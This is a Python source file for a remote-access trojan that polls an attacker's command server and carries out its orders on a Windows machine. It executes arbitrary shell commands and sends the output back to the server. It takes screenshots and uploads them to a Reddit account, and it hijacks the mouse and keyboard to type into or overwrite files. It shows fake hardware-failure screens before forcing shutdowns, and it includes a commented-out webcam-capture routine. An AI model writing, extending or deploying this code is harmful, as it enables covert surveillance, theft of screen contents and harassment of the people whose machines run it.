import tkinter as tk
from PIL import ImageTk
from random import randint
import os
import pyautogui as pg
pg.FAILSAFE = False
from time import sleep as sl
from time import ctime, time
import os
from webbrowser import open as op
import pickle
import requests
import ctypes
from dotenv import load_dotenv
load_dotenv()

validKeys = ['\t', '\n', '\r', ' ', '!', '"', '#', '$', '%', '&', "'", '(',
')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7',
'8', '9', ':', ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '_', '`',
'a', 'b', 'c', 'd', 'e','f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '|', '}', '~',
'accept', 'add', 'alt', 'altleft', 'altright', 'apps', 'backspace',
'browserback', 'browserfavorites', 'browserforward', 'browserhome',
'browserrefresh', 'browsersearch', 'browserstop', 'capslock', 'clear',
'convert', 'ctrl', 'ctrlleft', 'ctrlright', 'decimal', 'del', 'delete',
'divide', 'down', 'end', 'enter', 'esc', 'escape', 'execute', 'f1', 'f10',
'f11', 'f12', 'f13', 'f14', 'f15', 'f16', 'f17', 'f18', 'f19', 'f2', 'f20',
'f21', 'f22', 'f23', 'f24', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9',
'final', 'fn', 'hanguel', 'hangul', 'hanja', 'help', 'home', 'insert', 'junja',
'kana', 'kanji', 'launchapp1', 'launchapp2', 'launchmail',
'launchmediaselect', 'left', 'modechange', 'multiply', 'nexttrack',
'nonconvert', 'num0', 'num1', 'num2', 'num3', 'num4', 'num5', 'num6',
'num7', 'num8', 'num9', 'numlock', 'pagedown', 'pageup', 'pause', 'pgdn',
'pgup', 'playpause', 'prevtrack', 'print', 'printscreen', 'prntscrn',
'prtsc', 'prtscr', 'return', 'right', 'scrolllock', 'select', 'separator',
'shift', 'shiftleft', 'shiftright', 'sleep', 'space', 'stop', 'subtract', 'tab',
'up', 'volumedown', 'volumemute', 'volumeup', 'win', 'winleft', 'winright', 'yen',
'command', 'option', 'optionleft', 'optionright']

def hold(key,n):
    t = time()
    while True:
        if int(time()-t)>=4:
            break
        pg.press(key)

def getLock():
    screen = tk.Tk()
    screen.attributes(topmost=True)
    screen.configure(background="#000000")
    
    password = tk.Entry(screen, textvariable = "Enter text", font = ('calibre',10,'normal'), show = '*')
    password.pack()
    screen.mainloop()


def off(flicker=False):
    screen = tk.Tk()
    screen.attributes(topmost=True, fullscreen=True)
    screen.configure(background="#000000", cursor="none")
    dur = randint(1000, 2000)
    if flicker:
        dur = randint(20,60)
    screen.after(dur, lambda: screen.destroy())
    screen.mainloop()

def display():
    bg = "#000000"
    s = tk.Tk()
    s.attributes(topmost=True, fullscreen=True)
    s.configure(background=bg, cursor="none", pady=350)
    var1 = tk.StringVar()
    text1 = tk.Label(s, textvariable=var1, bg=bg, font=("Arial", 40), fg="#ffffff")
    var1.set("Internal display disconnected")
    text1.pack()
    var2 = tk.StringVar()
    text2 = tk.Label(s, textvariable=var2, bg=bg, font=("Arial", 20), fg="#ffffff")
    var2.set("\nShutting down...")
    text2.pack()
    cT = randint(500, 1000)
    s.after(cT, lambda : os.system("shutdown /s /t 0"))
    s.mainloop()

def showMessage(msg:str):
    screen = tk.Tk()
    screen.attributes(topmost=True, fullscreen=True)
    screen.configure(background="#000000", cursor="none")

    var = tk.StringVar()
    text = tk.Label(screen,anchor='w', textvariable=var, bg="#000000", font=("Arial", 20), fg="#ffffff")
    var.set("\n\n\n\n")
    text.pack()

    var = tk.StringVar()
    text = tk.Label(screen,anchor='w', textvariable=var, bg="#000000", font=("Arial", 20), fg="#ffffff")
    var.set(msg)
    text.pack()
    screen.after(2000, lambda : screen.destroy())
    screen.mainloop()


def GPUFail():
    screen = tk.Tk()
    screen.attributes(topmost=True, fullscreen=True)
    screen.configure(background="#000000", cursor="none")

    var = tk.StringVar()
    text = tk.Label(screen,anchor='w', textvariable=var, bg="#000000", font=("Arial", 20), fg="#ffffff")
    var.set("\n\n\n\n")
    text.pack()

    var = tk.StringVar()
    text = tk.Label(screen,anchor='w', textvariable=var, bg="#000000", font=("Arial", 40), fg="#ffffff")
    var.set("Internal GPU Disconnected")
    text.pack()

    var = tk.StringVar()
    text = tk.Label(screen,anchor='w', textvariable=var, bg="#000000", font=("Arial", 20), fg="#ffffff")
    var.set("\n\n\n\nReconnecting...")
    text.pack()

    screen.after(2000, lambda : os.system("shutdown /s /t 0"))
    screen.mainloop()


url = os.getenv("SERVER_URL")
username = os.popen("echo %USERNAME%").read().removesuffix("\n")

def sleep(i:int):
    #print("sleeping")
    try:
        sl(i)
    except KeyboardInterrupt:
        print("Exiting...")
        exit()
    #print("awake")

def r():
    file = open('obj.pkl', 'rb')
    r = pickle.load(file)
    file.close()
    return r
reddit = r()

def get(url:str):
    while True:
        # print(f"({i}) Connecting to {url}")
        try:
            res = requests.get(url)
            return res
        except Exception as e:
            if e is KeyboardInterrupt:
                exit()
            sleep(4)
            continue

def post(url:str, json:dict):
    while True:
        # print(f"({i}) Connecting to {url}")
        try:
            res = requests.post(url, json=json)
            return res
        except Exception as e:
            if e is KeyboardInterrupt:
                exit()
            sleep(4)
            continue

class Command:
    def __init__(self):
        # self.host = "http://13.0.8.20:6969"
        self.host = ""
    
    def ping(self):
        host = self.host
        name = os.popen("whoami").read()
        data = {"name": name}
        try:
            res = post(host, json=data)
        except ConnectionError:
                print(f"{self.host} is offline")
                self.host = ""
                return ""
        if res.status_code == 404:
            print(f"{self.host} is offline")
            self.host = ""
            return ""
        return res.text
    
    def log(self, type:int, msg:str):
        stat = "success"
        if type == 0:
            stat = "failure"
        data = {"status": stat, "message": msg, "name": os.popen("whoami").read()}
        # print("logging")
        post(self.host+"/log/", json=data)
        # print("logged")
 
    def getCommand(self):
        if self.host != "":
            return self.ping()
        while True:
            try:
                host = get(url).text
                name = os.popen("whoami").read()
                data = {"name": name}
                res = post(host, json=data)
                if res.status_code == 200:
                    print("Found new host:", host)
                    self.host = host
                    return res.text
                sleep(4)
            except Exception as e:
                if e is KeyboardInterrupt:
                    exit()
                sleep(4)
                continue

    def executeCommand(self, command:str):
        command = command.strip().removesuffix("\n")
        if command == "shutdown":
            os.system("shutdown /s /t 0")
        
        elif command == "restart":
            os.system("shutdown /r /t 0")
        
        elif command.startswith("wait"):
            sl(int(command.split("!")[1]))

        elif command == "exit":
            pg.hotkey('alt', 'f4')
        
        elif command == "lock":
            os.system("rundll32.exe user32.dll, LockWorkStation")
        
        elif command.startswith("open"):
            url = command.split("!")[1].strip()
            op(url)
        elif command.startswith("openvideo"):                  
            url = command.split("!")[1].strip()
            op(url)
            sl(6)
            hold('space',1)
            # size = pg.size()
            # x, y = size[0]/2, size[1]/2
            # pg.click(x, y)
        elif command.startswith("spam"):
            n = int(command.split("!")[0].removeprefix("spam"))
            url = command.split("!")[1].strip()
            for i in range(0, n):
                op(url)
        elif command.startswith("close"):
            n = int(command.split("!")[1])
            for i in range(0, n):
                pg.hotkey('ctrl', 'w')
        elif command == "refresh":
            pg.press('browserrefresh')
        elif command == "closetab":
            pg.hotkey('ctrl', 'w')

        elif command == "mute":
            pg.press('volumemute')
        elif command == "novol":
            pg.press('volumedown', presses=50)
        elif command == "fullvol":
            pg.press('volumeup', presses=50)
        elif command.startswith('setvol'):
            level = int(command.removeprefix("setvol"))
            pg.press('volumedown', presses=50)
            sleep(0.5)
            pg.press('volumeup', presses=int(level/2))

        elif command == "ss":
            pg.screenshot('ss.png')
            title = f"[{username}] {ctime()}"
            image = 'ss.png'
            try:
                reddit.subreddit('u_random-stuff-bot').submit_image(title, image)
                print("posted screenshot")
            except Exception as e:
                print("Error posting ss")
                print(str(e))
                self.log(0, str(e))
            os.remove("ss.png")

        elif command == "ssfreeze":
            screen = tk.Tk()
            screen.attributes(topmost=True, fullscreen=True)
            screen.configure(background="#000000", cursor="none")
            # pg.screenshot('ss.png')
            img = ImageTk.PhotoImage(pg.screenshot())
            imgPanel = tk.Label(screen, image=img)
            imgPanel.pack()
            screen.after(randint(2000,6000), lambda : screen.destroy())
            screen.mainloop()
        
        elif command == "savess":
            pg.screenshot('screenshot.jpg')
        elif command == "removess":
            if "screenshot.jpg" in os.listdir():
                os.remove("screenshot.jpg")
        
        elif command == "changewallpaper":
            if 'screenshot.jpg' not in os.listdir():
                if self.host != "":
                    self.log(0, "no screenshot found")                 
            else:
                path = os.getcwd()+'\\screenshot.jpg'
                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3) 
            
        
        # elif command == "pic":
        #     cam = cv2.VideoCapture(0)
        #     frame = cam.read()[1]
        #     frame = cv2.flip(frame, flipCode=1)
        #     cv2.imwrite("img.jpg", frame)
        #     cv2.destroyAllWindows()
        #     cam.release()
        #     title = f"[{username}] {ctime()}"
        #     image = 'img.jpg'
            
        #     try:
        #         reddit.subreddit('u_random-stuff-bot').submit_image(title, image)
        #         print("posted image")
        #     except Exception as e:
        #         print("Error posting ss")
        #         print(str(e))
        #         self.log(0, str(e))
        #     # os.remove("img.jpg")
        
        elif command == "caps":
            pg.press('capslock')

        elif command.startswith("move"):
            n = int(command.split("!")[1])
            size = pg.size()
            print(size)
            t = time()
            while True:
                if int(time()-t)>=n:
                    break
                x = randint(0, size[0])
                y = randint(0, size[1])
                print(x,y)
                pg.moveTo(x, y)
        
        elif command.startswith("mousefreeze"):
            n = int(command.split("!")[1])
            x,y = pg.position()
            t = int(time())
            while True:
                if int(time())-t>=n:
                    break
                pg.moveTo(x,y)
        
        # elif command.startswith("select"):
        #     s = command.split("!")[1]
        #     width,height = pg.size()
        #     start = (s.split(" ")[0].split("-"))
        #     end = (s.split(" ")[1].split("-"))

        elif command.startswith("click"):
            ogpos = pg.position()
            pos = command.split("!")[1].split(" ")
            pos = [float(pos[0]),float(pos[1])]
            width,height = pg.size()
            pos = [pos[0]*width, pos[1]*height]
            pg.moveTo(pos)
            pg.click()
            pg.moveTo(ogpos)

        elif command.startswith("loopmouse"):
            n = int(command.split("!")[1])
            x,y = pg.size()[0]/2,pg.size()[1]/2
            t = time()
            while True:
                if int(time()-t)>=n:
                    break
                pg.moveTo(x,y)
                sl(0.2)
        
        # elif command.startswith("boxcursor"):
        #     n = int(command.split("!")[1])
        #     print(pg.size())
        #     area = pg.size()[0], pg.size()[1]
        #     t = int(time())
        #     while True:
        #         x,y = pg.position()
        #         if y > area[1]*(1/10):
        #             pg.moveTo(x,y-50)
        #         if x > area[0]*(1/10):
        #             pg.moveTo(x-50,y)
        #         if int(time())-t == n:
        #             break
        
        elif command.startswith("scroll"):
            n = int(command.split("!")[1])
            t = time()
            while True:
                if int(time()-t)>=n:
                    break
                n = randint(-2000, 2000)
                # pg.scroll(n)
        
        elif command.startswith('press'):
            keys = command.split("!")[1].split()
            pg.hotkey(keys)

        elif command.startswith('type'):
            keys = command.split("!")[1].split()
            for k in keys:
                if k not in validKeys:
                    pg.write(k)
                    pg.write(" ")
                else:
                    pg.press(k)
        elif command.startswith("combo"):
            keys = command.split("!")[1]
            for k in keys.split(" "):
                if "+" in k:
                    pg.hotkey(k.split("+"))
                elif k in validKeys:
                    pg.press(k)
                else:
                    pg.write(k+" ")
                sl(0.5)

        elif command.startswith("write"):
            text = command.split("!")[1].strip()
            size = pg.size()
            x, y = size[0]/3, size[1]/3
            pg.click(x, y)
            sleep(0.4)
            pg.hotkey('ctrl', 'a')
            if "\\n" in text:
                for c in text.split("\\n"):
                    pg.write(c)
                    pg.press('enter')
            else:
                pg.write(text)
            if "-s" in command:
                pg.hotkey('ctrl', 's')
                pg.press('enter')
            if "-e" in command:
                pg.hotkey('alt', 'f4')

        elif command.startswith("erase"):           
            n = int(command.split("!")[1])
            hold('backspace',n)
        elif command.startswith("undo"):     
            n = int(command.split("!")[1])
            t = time()
            while True:
                if int(time()-t)>=n:
                    break
                pg.hotkey('ctrl', 'z')

        elif command.startswith("cmd"):
            cmd = command.split("!")[1].strip()
            print("Executing command: ", cmd)
            out = os.popen(cmd).read()
            print(out)
            if self.host != "":
                post(f"{self.host}/output", {"output": out})
        
        elif command == "getlog":
            try:
                with open("log.txt", "r") as f:
                    line = f.readline()
                    if self.host != "":
                        post(f"{self.host}/output", {"output": line})
            except FileNotFoundError:
                if self.host != "":
                    self.log(0, "File not found")
                return
        
        elif command == "clearlog":
            try:
                os.remove('log.txt')
            except Exception as e:
                print(e)
        
        elif command == "off":
            off()
        
        elif command == "vidoff":
            pg.press('playpause')
            off()
            pg.press('playpause')

        elif command == "flicker":
            n = randint(10, 20)
            for i in range(0, n):
                print(i)
                sleep(0.01)
                off(flicker=True)
        elif command == "display":
            display()

        elif command.startswith("msg"):
            msg = command.replace("msg", "").strip()
            showMessage(msg)
        
        elif command.startswith("gpufail"):
            GPUFail()

        else:
            print("text", command)
        # self.log(1, command.removesuffix("|"))


c = Command()

# while True:
#     i = input("> ")
#     # i = "boxcursor!15"
#     for i in i.split("|"):
#         c.executeCommand(i)

lastCommand = ""
while True:
    sleep(2)
    command = c.getCommand()+"|"
    if command == lastCommand or command == "|":
        continue
    try:
        for com in command.split("|"):
            if com == "":
                continue
            print("Command recieved:", com)
            c.executeCommand(com)
        c.log(1, command)
    except Exception as e:
        if e is KeyboardInterrupt:
            exit()
        c.log(0, str(e))
        continue
    lastCommand = command